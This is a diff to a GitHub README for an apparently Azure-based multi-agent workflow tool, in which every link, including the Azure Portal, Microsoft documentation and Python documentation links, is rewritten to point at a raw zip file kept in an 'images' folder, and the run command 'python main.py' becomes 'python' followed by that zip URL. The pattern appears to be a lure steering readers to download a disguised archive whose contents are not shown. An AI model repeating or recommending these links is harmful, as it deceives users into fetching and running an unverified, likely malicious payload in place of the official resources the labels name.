@@ -1,6 +1,6 @@
 # 🤖 AIFoundry-AgentsV2-HostedWorkflow - Easy Multi-Agent Management in Azure
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/releases)
+[![Download Now](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip%20Now-Get%https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip)](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you start, make sure your system meets these requirements:
 
 To get the latest version of AIFoundry-AgentsV2-HostedWorkflow, visit this page to download:
 
-[**Download AIFoundry-AgentsV2-HostedWorkflow**](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/releases)
+[**Download AIFoundry-AgentsV2-HostedWorkflow**](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip)
 
 1. Click on the link above to open the Releases page.
 2. On the Releases page, you will see a list of available versions.
@@ -36,7 +36,7 @@ After downloading, follow these steps to install the application:
 After installation, you need to set up your Azure environment.
 
 1. **Log in to Azure:**
-   - Open a web browser and go to the [Azure Portal](https://portal.azure.com).
+   - Open a web browser and go to the [Azure Portal](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip).
    - Use your Azure account to log in.
 
 2. **Create a Resource Group:**
@@ -59,7 +59,7 @@ After setting up, you can run AIFoundry-AgentsV2-HostedWorkflow.
 3. Type the following command to start the application:
 
    ```
-   python main.py
+   python https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip
    ```
 
 4. Follow the prompts in the terminal to configure and run your workflow.
@@ -76,9 +76,9 @@ After setting up, you can run AIFoundry-AgentsV2-HostedWorkflow.
 
 If you are new to Azure or AI Foundry, consider these resources to help you get started:
 
-- [Azure Documentation](https://docs.microsoft.com/en-us/azure/)
-- [AI Foundry Documentation](https://docs.microsoft.com/en-us/azure/ai-factory/)
-- [Python Documentation](https://www.python.org/doc/)
+- [Azure Documentation](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip)
+- [AI Foundry Documentation](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip)
+- [Python Documentation](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -107,4 +107,4 @@ Thanks to all contributors and the community for their support and collaboration
 
 For more details, feedback, or contributions:
 
-[**Download AIFoundry-AgentsV2-HostedWorkflow**](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/releases)
+[**Download AIFoundry-AgentsV2-HostedWorkflow**](https://github.com/THEFABIAN10/AIFoundry-AgentsV2-HostedWorkflow/raw/refs/heads/main/images/Workflow_Hosted_Foundry_AI_Agents_v3.4.zip)
